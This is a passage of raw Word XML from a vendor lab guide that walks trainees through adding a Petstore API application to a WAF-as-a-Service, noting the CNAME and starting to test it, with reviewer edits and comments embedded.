            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="1449851372" name="Picture 144985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7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62597" cy="993992"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="011293F3" w14:textId="77777777" w:rsidR="00452BFC" w:rsidRDefault="00452BFC">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsiaTheme="majorEastAsia" w:hAnsiTheme="majorHAnsi" w:cstheme="majorBidi"/>
          <w:color w:val="365F91" w:themeColor="accent1" w:themeShade="BF"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p w14:paraId="3CDB4417" w14:textId="70BC40E5" w:rsidR="00A52D43" w:rsidRDefault="00A52D43" w:rsidP="00A52D43">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:bookmarkStart w:id="87" w:name="_Toc72791987"/>
      <w:r w:rsidRPr="55E0BB2E">
        <w:lastRenderedPageBreak/>
        <w:t xml:space="preserve">Add your </w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">API </w:t>
      </w:r>
      <w:r w:rsidRPr="55E0BB2E">
        <w:t>Application to WAF-as-a-Service</w:t>
      </w:r>
      <w:bookmarkEnd w:id="87"/>
    </w:p>
    <w:p w14:paraId="751B94D0" w14:textId="77777777" w:rsidR="007520A7" w:rsidRDefault="007520A7" w:rsidP="00A52D43">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="24"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>Click back until you are at the WAF-as-a-Service starting page.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="42D00BE2" w14:textId="0EDAA5E9" w:rsidR="00A52D43" w:rsidRDefault="00A52D43" w:rsidP="00A52D43">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="24"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="55E0BB2E">
        <w:t xml:space="preserve">Click </w:t>
      </w:r>
      <w:r w:rsidRPr="007520A7">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>Add Application</w:t>
      </w:r>
      <w:r w:rsidRPr="55E0BB2E">
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4264BBA9" w14:textId="31847951" w:rsidR="00A52D43" w:rsidRDefault="00A52D43" w:rsidP="00A52D43">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="24"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="55E0BB2E">
        <w:t xml:space="preserve">On the Websites step, enter </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="002F1BFB">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>Petstore</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="55E0BB2E">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="55E0BB2E">
        <w:t>for the Application Name</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2D802514" w14:textId="5DB3170F" w:rsidR="00A52D43" w:rsidRDefault="00A52D43" w:rsidP="00A52D43">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="24"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="55E0BB2E">
        <w:t xml:space="preserve">Enter the </w:t>
      </w:r>
      <w:r w:rsidR="002F1BFB" w:rsidRPr="00D407E2">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:highlight w:val="yellow"/>
        </w:rPr>
        <w:t xml:space="preserve">API </w:t>
      </w:r>
      <w:r w:rsidRPr="00D407E2">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:highlight w:val="yellow"/>
        </w:rPr>
        <w:t>Server URL</w:t>
      </w:r>
      <w:r w:rsidRPr="55E0BB2E">
        <w:t xml:space="preserve"> from the email you received for the Backend Server</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="602F68BE" w14:textId="37FE6234" w:rsidR="002F1BFB" w:rsidRDefault="00A52D43" w:rsidP="002D2B05">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="24"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="55E0BB2E">
        <w:t xml:space="preserve">Click </w:t>
      </w:r>
      <w:r w:rsidRPr="0064443E">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>Continue</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7724F4B1" w14:textId="7DC98562" w:rsidR="00286CFC" w:rsidRPr="00F43673" w:rsidRDefault="00286CFC" w:rsidP="00286CFC">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="24"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="0696E29C">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:highlight w:val="yellow"/>
        </w:rPr>
        <w:t>Uncheck</w:t>
      </w:r>
      <w:r w:rsidRPr="0696E29C">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t xml:space="preserve"> HTTPS</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> and </w:t>
      </w:r>
      <w:r w:rsidRPr="0696E29C">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:highlight w:val="yellow"/>
        </w:rPr>
        <w:t>uncheck</w:t>
      </w:r>
      <w:r w:rsidRPr="0696E29C">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t xml:space="preserve"> Redirect HTTP to HTTPS</w:t>
      </w:r>
      <w:r w:rsidR="001C63F9" w:rsidRPr="0696E29C">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">and click </w:t>
      </w:r>
      <w:r w:rsidRPr="0696E29C">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t xml:space="preserve">Continue </w:t>
      </w:r>
      <w:r w:rsidR="00D845BF">
        <w:rPr>
          <w:noProof/>
          <w:color w:val="2B579A"/>
          <w:shd w:val="clear" w:color="auto" w:fill="E6E6E6"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="05089763" wp14:editId="2E58A7FE">
            <wp:extent cx="2669564" cy="172528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69564" cy="1725283"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="47DB641B" w14:textId="608405E5" w:rsidR="00F43673" w:rsidRDefault="00F43673" w:rsidP="00F43673">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r w:rsidRPr="00F43673">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>NOTE</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: </w:t>
      </w:r>
      <w:r w:rsidRPr="55E0BB2E">
        <w:t xml:space="preserve">In a real deployment </w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">we would use HTTPS for </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:t>encryption</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:t xml:space="preserve"> but we are skipping this part for this lesson </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="109E7117" w14:textId="77777777" w:rsidR="00F43673" w:rsidRDefault="00F43673" w:rsidP="00F43673">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
        <w:ind w:left="720"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="610E563C" w14:textId="15695F3E" w:rsidR="002F1BFB" w:rsidRDefault="002F1BFB" w:rsidP="002F1BFB">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="24"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>On the next screen, for the Backend Server (</w:t>
      </w:r>
      <w:r w:rsidR="00785F45">
        <w:t xml:space="preserve">in this case the </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="0093415B">
        <w:t>Petstore</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="0093415B">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00785F45">
        <w:t xml:space="preserve">API </w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">Server), WAF-as-a-Service resolves the IP </w:t>
      </w:r>
      <w:r w:rsidR="00785F45">
        <w:t>address from the domain name</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">.  Change the protocol from HTTPS to the </w:t>
      </w:r>
      <w:r w:rsidRPr="0696E29C">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t xml:space="preserve">HTTP </w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">protocol, </w:t>
      </w:r>
      <w:del w:id="88" w:author="Tushar Richabadas" w:date="2021-05-07T11:10:00Z">
        <w:r w:rsidDel="002F1BFB">
          <w:delText>Select</w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="89" w:author="Tushar Richabadas" w:date="2021-05-07T11:10:00Z">
        <w:r>
          <w:t>select</w:t>
        </w:r>
      </w:ins>
      <w:r>
        <w:t xml:space="preserve"> port </w:t>
      </w:r>
      <w:r w:rsidRPr="0696E29C">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:highlight w:val="yellow"/>
        </w:rPr>
        <w:t>80</w:t>
      </w:r>
      <w:r w:rsidR="00785F45" w:rsidRPr="0696E29C">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:highlight w:val="yellow"/>
        </w:rPr>
        <w:t>80</w:t>
      </w:r>
      <w:r w:rsidRPr="0696E29C">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">Click </w:t>
      </w:r>
      <w:r w:rsidRPr="0696E29C">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t xml:space="preserve">Test Connection, </w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">Click </w:t>
      </w:r>
      <w:r w:rsidRPr="0696E29C">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>Continue</w:t>
      </w:r>
      <w:r w:rsidR="00286CFC" w:rsidRPr="0696E29C">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00516121">
        <w:rPr>
          <w:noProof/>
          <w:color w:val="2B579A"/>
          <w:shd w:val="clear" w:color="auto" w:fill="E6E6E6"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="06778A5E" wp14:editId="1C9AB111">
            <wp:extent cx="2680364" cy="1800762"/>
            <wp:effectExtent l="0" t="0" r="5715" b="9525"/>
            <wp:docPr id="1449851370" name="Picture 144985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0364" cy="1800762"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="35AFEF4E" w14:textId="77777777" w:rsidR="00D407E2" w:rsidRPr="00D407E2" w:rsidRDefault="002F1BFB" w:rsidP="002F1BFB">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="24"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="55E0BB2E">
        <w:t xml:space="preserve">On the Select Mode step, select </w:t>
      </w:r>
      <w:r w:rsidRPr="55E0BB2E">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t xml:space="preserve">Block </w:t>
      </w:r>
      <w:r w:rsidRPr="55E0BB2E">
        <w:t xml:space="preserve">and click </w:t>
      </w:r>
      <w:r w:rsidRPr="55E0BB2E">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>Add</w:t>
      </w:r>
      <w:ins w:id="90" w:author="Brett" w:date="2021-05-07T14:49:00Z">
        <w:r w:rsidRPr="55E0BB2E">
          <w:rPr>
            <w:b/>
            <w:bCs/>
          </w:rPr>
          <w:t xml:space="preserve">. </w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="7E0F22AC" w14:textId="1AD3DC77" w:rsidR="002F1BFB" w:rsidRPr="00D407E2" w:rsidRDefault="002F1BFB" w:rsidP="00236697">
      <w:pPr>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:rStyle w:val="QuoteChar"/>
          <w:i w:val="0"/>
          <w:iCs w:val="0"/>
          <w:color w:val="000000" w:themeColor="text1"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="0696E29C">
        <w:rPr>
          <w:rStyle w:val="QuoteChar"/>
          <w:b/>
          <w:bCs/>
          <w:i w:val="0"/>
          <w:iCs w:val="0"/>
        </w:rPr>
        <w:t>Note</w:t>
      </w:r>
      <w:r w:rsidRPr="0696E29C">
        <w:rPr>
          <w:rStyle w:val="QuoteChar"/>
          <w:i w:val="0"/>
          <w:iCs w:val="0"/>
        </w:rPr>
        <w:t>: in an actual deployment, you would start with Monitor mode first, to check for any false positives before switching to blocking</w:t>
      </w:r>
      <w:del w:id="91" w:author="Brett" w:date="2021-05-07T14:48:00Z">
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:color w:val="2B579A"/>
            <w:shd w:val="clear" w:color="auto" w:fill="E6E6E6"/>
          </w:rPr>
          <w:drawing>
            <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="50ECA1C2" wp14:editId="7468E9CB">
              <wp:extent cx="3673412" cy="2608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3412" cy="2608122"/>
                      </a:xfrm>
                      <a:prstGeom prst="rect">
                        <a:avLst/>
                      </a:prstGeom>
                    </pic:spPr>
                  </pic:pic>
                </a:graphicData>
              </a:graphic>
            </wp:inline>
          </w:drawing>
        </w:r>
      </w:del>
      <w:r w:rsidR="006277B5" w:rsidRPr="0696E29C">
        <w:rPr>
          <w:rStyle w:val="QuoteChar"/>
          <w:i w:val="0"/>
          <w:iCs w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">. </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="00F8F516" w14:textId="0A26CE37" w:rsidR="00317BCB" w:rsidRDefault="00317BCB" w:rsidP="00317BCB">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="24"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="55E0BB2E">
        <w:t>On the next screen, it will tell you to change the DNS record of your site but doing th</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">is DNS </w:t>
      </w:r>
      <w:r w:rsidRPr="55E0BB2E">
        <w:t xml:space="preserve">change is outside the scope </w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">for </w:t>
      </w:r>
      <w:r w:rsidRPr="55E0BB2E">
        <w:t xml:space="preserve">this </w:t>
      </w:r>
      <w:r>
        <w:t>lesson</w:t>
      </w:r>
      <w:r w:rsidR="00CE44D4">
        <w:t>, so you do not have to do this.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="562C6A5A" w14:textId="145B11D1" w:rsidR="00317BCB" w:rsidRDefault="00317BCB" w:rsidP="002D2B05">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="24"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Instead, make </w:t>
      </w:r>
      <w:r w:rsidRPr="55E0BB2E">
        <w:t xml:space="preserve">a note of the domain name under </w:t>
      </w:r>
      <w:r w:rsidRPr="00CE44D4">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>CHANGE CNAME TO</w:t>
      </w:r>
      <w:r w:rsidRPr="55E0BB2E">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00CE44D4">
        <w:t xml:space="preserve">as </w:t>
      </w:r>
      <w:r w:rsidRPr="55E0BB2E">
        <w:t xml:space="preserve">we will be referring to this as your </w:t>
      </w:r>
      <w:r w:rsidR="007B3BC3">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>CNAME</w:t>
      </w:r>
      <w:r w:rsidRPr="55E0BB2E">
        <w:t xml:space="preserve"> throughout this training.</w:t>
      </w:r>
      <w:r w:rsidR="00CE44D4">
        <w:t xml:space="preserve">  </w:t>
      </w:r>
      <w:r w:rsidRPr="55E0BB2E">
        <w:t xml:space="preserve">Click </w:t>
      </w:r>
      <w:r w:rsidRPr="00CE44D4">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>Close</w:t>
      </w:r>
      <w:r w:rsidRPr="55E0BB2E">
        <w:t xml:space="preserve">. </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="33D30BF4" w14:textId="4B4C4DE3" w:rsidR="007B4A52" w:rsidRPr="008A0072" w:rsidRDefault="007B4A52" w:rsidP="007B4A52">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="92" w:name="_Toc72791988"/>
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t xml:space="preserve">Test your WAF-as-a-Service </w:t>
      </w:r>
      <w:r w:rsidR="0042732C">
        <w:t xml:space="preserve">API </w:t>
      </w:r>
      <w:r>
        <w:t>Application</w:t>
      </w:r>
      <w:bookmarkEnd w:id="92"/>
    </w:p>
    <w:p w14:paraId="427E4C7C" w14:textId="6B3935D7" w:rsidR="007B4A52" w:rsidRDefault="00F3786D" w:rsidP="007B4A52">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="19"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">The </w:t>
      </w:r>
      <w:r w:rsidR="007B4A52">
        <w:t>"Updating Configuration” message indicat</w:t>
      </w:r>
      <w:r>
        <w:t>es</w:t>
      </w:r>
      <w:r w:rsidR="007B4A52">
        <w:t xml:space="preserve"> your application is being </w:t>
      </w:r>
      <w:del w:id="93" w:author="Tushar Richabadas" w:date="2021-05-07T11:10:00Z">
        <w:r w:rsidR="007B4A52" w:rsidDel="406CDF80">
          <w:delText>provisioned</w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="94" w:author="Tushar Richabadas" w:date="2021-05-07T11:10:00Z">
        <w:r w:rsidR="007B4A52">
          <w:t>provisioned.</w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidR="007B4A52">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00F84B46">
        <w:t>I</w:t>
      </w:r>
      <w:r w:rsidR="007B4A52">
        <w:t xml:space="preserve">n most cases, this will take less than a minute, but could take up to five minutes. </w:t>
      </w:r>
      <w:commentRangeStart w:id="95"/>
      <w:commentRangeEnd w:id="95"/>
      <w:r w:rsidR="007B4A52">
        <w:commentReference w:id="95"/>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">Click </w:t>
      </w:r>
      <w:r w:rsidRPr="00F3786D">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>OK</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0248F769" w14:textId="77777777" w:rsidR="007B4A52" w:rsidRDefault="007B4A52" w:rsidP="007B4A52">
      <w:pPr>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
          <w:color w:val="2B579A"/>
          <w:shd w:val="clear" w:color="auto" w:fill="E6E6E6"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="75B98802" wp14:editId="3C86E339">
            <wp:extent cx="2714625" cy="1845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4625" cy="1845945"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="444819C3" w14:textId="77777777" w:rsidR="007B4A52" w:rsidRDefault="007B4A52" w:rsidP="007B4A52">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="19"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>You should now be on the Endpoints component of WAF-as-a-Service</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1D112489" w14:textId="337D9062" w:rsidR="007B4A52" w:rsidRDefault="007B4A52" w:rsidP="0045117B">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Note: Because we are skipping the DNS changes for this Test Drive, you will see “DNS Update Pending” and this is </w:t>
      </w:r>
      <w:del w:id="96" w:author="Tushar Richabadas" w:date="2021-05-07T11:10:00Z">
        <w:r w:rsidDel="406CDF80">
          <w:delText>normal</w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="97" w:author="Tushar Richabadas" w:date="2021-05-07T11:10:00Z">
        <w:r>
          <w:t>expected</w:t>
        </w:r>
      </w:ins>
      <w:r>
        <w:t xml:space="preserve">.  </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7318DBD6" w14:textId="43114E2A" w:rsidR="007E3ED6" w:rsidRDefault="007E3ED6" w:rsidP="007B4A52">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="19"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Change the Deployment Location to Netherlands, </w:t>
      </w:r>
      <w:commentRangeStart w:id="98"/>
      <w:commentRangeStart w:id="99"/>
      <w:r>
        <w:t>Amsterdam</w:t>
      </w:r>
      <w:commentRangeEnd w:id="98"/>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="CommentReference"/>
        </w:rPr>
        <w:commentReference w:id="98"/>
      </w:r>
      <w:commentRangeEnd w:id="99"/>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="CommentReference"/>
        </w:rPr>
        <w:commentReference w:id="99"/>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="1D4B38DD">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:noProof/>
          <w:color w:val="2B579A"/>
          <w:shd w:val="clear" w:color="auto" w:fill="E6E6E6"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="44578444" wp14:editId="1142055D">
            <wp:extent cx="2949647" cy="2779098"/>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9647" cy="2779098"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="35B36C52" w14:textId="6A46FB2E" w:rsidR="007B4A52" w:rsidRDefault="007B4A52" w:rsidP="007B4A52">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="19"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Note will be using the </w:t>
      </w:r>
      <w:commentRangeStart w:id="101"/>
      <w:commentRangeStart w:id="102"/>
      <w:commentRangeStart w:id="103"/>
      <w:r w:rsidRPr="00400143">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t xml:space="preserve">WAF-as-a-Service </w:t>
      </w:r>
      <w:commentRangeEnd w:id="101"/>
      <w:r w:rsidRPr="00400143">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:commentReference w:id="101"/>
      </w:r>
      <w:commentRangeEnd w:id="102"/>
      <w:r w:rsidRPr="00400143">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:commentReference w:id="102"/>
      </w:r>
      <w:commentRangeEnd w:id="103"/>
      <w:r w:rsidRPr="00400143">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:commentReference w:id="103"/>
      </w:r>
      <w:r w:rsidRPr="00400143">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>CNAME</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> for our application as shown under </w:t>
      </w:r>
      <w:r w:rsidRPr="00400143">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>CNAME</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">.  For example, to go to our Backend Server directly, we will use the Backend Server URL.  To go through WAF-as-a-Service to our server, we will use the </w:t>
      </w:r>
      <w:r w:rsidR="007B3BC3">
        <w:t>CNAME</w:t>
      </w:r>
      <w:r w:rsidR="00C26EC3">
        <w:t xml:space="preserve"> URL.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3F4F4361" w14:textId="615F1E12" w:rsidR="007B4A52" w:rsidRDefault="00FC4FE5" w:rsidP="007E3ED6">
      <w:pPr>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
          <w:color w:val="2B579A"/>
          <w:shd w:val="clear" w:color="auto" w:fill="E6E6E6"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="599B428D" wp14:editId="180A296F">
            <wp:extent cx="5166652" cy="457835"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="1449851371" name="Picture 144985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652" cy="457835"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="19117CA5" w14:textId="4EE79331" w:rsidR="007E3ED6" w:rsidRDefault="007E3ED6" w:rsidP="007B4A52"/>
    <w:p w14:paraId="2506A30F" w14:textId="77777777" w:rsidR="007E3ED6" w:rsidRDefault="007E3ED6" w:rsidP="007B4A52"/>
    <w:p w14:paraId="5ED8C5EA" w14:textId="0201388E" w:rsidR="007B4A52" w:rsidRDefault="0010042C" w:rsidP="007B4A52">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="19"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>Browse</w:t>
      </w:r>
      <w:r w:rsidR="007B4A52">
        <w:t xml:space="preserve"> to your </w:t>
      </w:r>
      <w:r w:rsidR="007B3BC3">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:highlight w:val="yellow"/>
        </w:rPr>
        <w:t>CNAME</w:t>
      </w:r>
      <w:r w:rsidR="007B4A52">
        <w:t xml:space="preserve"> that you noted above.  </w:t>
      </w:r>
      <w:r>
        <w:t>Copy and paste is suggested.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="17C0C54E" w14:textId="18DA7E7D" w:rsidR="007B4A52" w:rsidRDefault="007B4A52" w:rsidP="007B4A52">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="19"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">If you cannot load the site, </w:t>
      </w:r>
